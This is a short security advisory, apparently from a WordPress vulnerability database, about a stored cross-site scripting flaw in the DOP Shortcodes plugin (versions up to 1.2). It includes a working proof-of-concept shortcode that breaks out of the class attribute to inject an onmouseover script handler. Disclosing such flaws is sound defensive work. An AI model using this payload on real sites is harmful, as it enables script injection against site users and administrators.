## WordPress Plugin Vulnerabilities

# DOP Shortcodes <= 1.2 - Contributor+ Stored XSS via Shortcode

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in a page/post where the shortcode is embed, which could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks

### Proof of Concept

Add the following shortcode to a post:
```
[dopaccordions class='wp-block-search\_\_button" onmouseover="alert(/XSS/)"']
[dopaccordion title="Title 1"]text[/dopaccordion]
[dopaccordion title="Title 2"]text[/dopaccordion]
[dopaccordion title="Title 3"]text[/dopaccordion]
[/dopaccordions]
```
Move your mouse over the accordion to see the XSS
